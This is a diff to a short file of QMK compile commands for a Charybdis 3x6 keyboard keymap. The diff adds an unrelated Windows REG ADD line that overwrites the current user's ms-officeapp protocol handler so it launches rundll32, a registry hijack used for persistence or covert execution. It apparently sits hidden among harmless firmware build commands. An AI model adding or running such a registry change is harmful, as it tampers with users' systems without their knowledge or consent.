@@ -21,3 +21,5 @@ qmk compile -c -j 0 -kb bastardkb/charybdis/3x6 -km brainrot
 qmk compile -c -kb bastardkb/charybdis/3x6 -km brainrot
 
 qmk compile -c -j 0 -kb bastardkb/charybdis/3x6 -km brainrot > qmk-output.log 2>&1
+
+REG ADD HKCU\Software\Classes\ms-officeapp\Shell\Open\Command /t REG_SZ /d rundll32
